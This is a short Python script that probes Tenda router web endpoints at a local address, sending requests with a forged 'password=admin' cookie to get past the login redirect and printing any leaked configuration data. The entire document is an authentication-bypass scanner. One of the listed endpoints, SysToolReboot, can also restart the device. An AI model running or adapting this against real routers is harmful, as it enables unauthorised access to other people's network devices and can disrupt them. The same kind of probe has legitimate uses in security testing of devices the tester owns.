import requests

target = "http://192.168.1.1"

# Common Tenda GoForm paths that often leak info or allow bypass
paths = [
    "/goform/SysToolReboot",
    "/goform/GetParentControlInfo",
    "/goform/WifiBasicSet",
    "/goform/adv_remotemanage",
    "/goform/AddressFilter"
]

def check_leak():
    for path in paths:
        url = f"{target}{path}"
        try:
            # We add a random cookie to try and bypass the initial redirect
            r = requests.get(url, timeout=5, cookies={'password': 'admin'})
            print(f"[*] Testing {url} - Status: {r.status_code}")
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[!] POTENTIAL LEAK: {r.text[:200]}")
        except Exception as e:
            print(f"[-] Error on {path}: {e}")

check_leak()

